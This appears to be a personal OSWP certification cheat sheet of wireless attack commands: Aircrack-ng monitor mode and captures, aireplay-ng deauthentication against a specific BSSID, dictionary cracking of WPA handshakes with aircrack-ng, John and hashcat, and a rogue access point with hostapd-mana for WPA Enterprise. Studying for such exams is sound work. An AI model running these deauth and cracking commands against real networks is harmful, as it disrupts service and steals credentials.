# OSWP

## Aircrack-ng 
### Packet sniffer, network detector, frame injection, cracks WEP and WPA-PSK 
```
sudo airmon-ng check
sudo airmon-ng check kill

sudo /usr/sbin/airmon-ng
sudo airmon-ng start wlan0
sudo airmon-ng start wlan0 [channel #]
sudo airmon-ng stop wlan0

iw wlan0 info
iwconfig
ifconfig

```

## Airodump-ng 
### WEP, WPA/WPA2
#### Don't forget to specify interface
```
sudo airodump-ng wlan0mon -c 2
sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w 1.cap
```
|CMD|DESC|
|-----|-----|
|-w|output filename| 
|--bsssid|specific BSSID|
|--essid|specific ESSID|
|-c|channel|
|-g|GPS|
|--ivs| Interval Vectors
|-R|Regular Expression|

## Aireplay-ng
### Generate wireless traffic, deauths, WEP
#### Set card to channel [#]
```
sudo airmon-ng start wlan0 # 
```
### Deauth
```
sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 wlan0mon
```
|CMD|DESC|
|-----|-----|
-0 |# deauths
0 | continuous
-a|BSSID
-c|client MAC

## Aircrack-ng
### Cracking Hashes
```
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
```
### John the Ripper
```
john --format=netntlm timothy --wordlist=/usr/share/wordlists/rockyou.txt
```
### Hashcat
```
hashcat -m [hashtype] [hash] [dictionary]
```
## Useful Linux Commands
```
scp kali@192.168.10.94:/home/kali/1.cap-01.cap .
gzip -d file .gz
```
## Attacking WPA Enterprise
```
sudo airodump-ng wlan0mon
WPA2 CCMP MGT = WPA Enterprise
```
### Capture handshake > Wireshark > tls.handshake.type==11 
### Server certificate frame > EAP > TLS > Certificate
### Create certs with FreeRadius
### Hostapd-mana > mana.conf > mana.eap_user
```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
